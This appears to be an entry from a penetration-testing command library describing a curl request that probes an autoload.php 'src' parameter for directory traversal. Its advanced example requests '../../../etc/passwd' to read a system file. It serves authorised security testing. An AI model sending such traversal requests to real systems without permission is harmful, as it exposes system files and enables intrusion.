---
data: 'curl "http://target/autoload.php?src=../"'
tags:
  - web-testing
  - traversal
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:05.923Z'
id: 18303003-09be-4eec-95fe-8d4d8eba0968
verified: false
validated: true
submitted: true
---
# curl-directory-traversal-test

## Command

```bash
curl "http://target/autoload.php?src=../"
```

## Description

This command uses curl to send an HTTP GET request to the autoload.php endpoint with a directory traversal payload in the 'src' parameter, testing for information disclosure by attempting to access the parent directory.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL | The target endpoint with 'src' parameter | Yes |
| `--silent` (optional) | Suppress progress meter | No |
| `-v` (optional) | Verbose output for debugging | No |

## Examples

### Basic Usage

```bash
curl "http://target/autoload.php?src=../"
```

### Advanced Usage

```bash
curl -v "http://target/autoload.php?src=../../../etc/passwd" -o output.txt
```

## Expected Output

If vulnerable, the response may include directory contents, full paths, or file data like:
```
/var/www/html/parent_dir/file1.php
/etc/passwd contents...
```
Error messages might also leak paths, e.g., "Failed to open /absolute/path/to/file".

## Related

- [[Related Procedure: Test-Directory-Traversal-with-src-Parameter]]
